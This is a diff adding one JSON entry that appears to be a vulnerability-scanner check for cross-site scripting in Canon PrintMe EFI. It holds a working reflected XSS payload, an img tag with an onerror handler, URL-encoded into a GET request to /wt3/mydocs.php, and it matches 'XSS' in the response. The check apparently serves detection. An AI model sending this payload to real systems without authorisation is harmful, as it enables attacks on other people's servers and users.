@@ -1,0 +1,1 @@
+{"httpMethod":"GET","list":[],"myRequestBody":"","myRequestHeaders":{},"pocFix":"upgrade","pocName":"Canon PrintMe EFI - Cross-Site Scripting","relation":"AND","respCompareCode":"","respCompareRelation":"==","respContent":"XSS","respHeader1":"","respHeader1ContainsContent":"","respHeaderContain":"","uri":"/wt3/mydocs.php/'%22--!%3E%3Cimg%20src=x%20onerror=alert(%22XSS%22)%3E"}
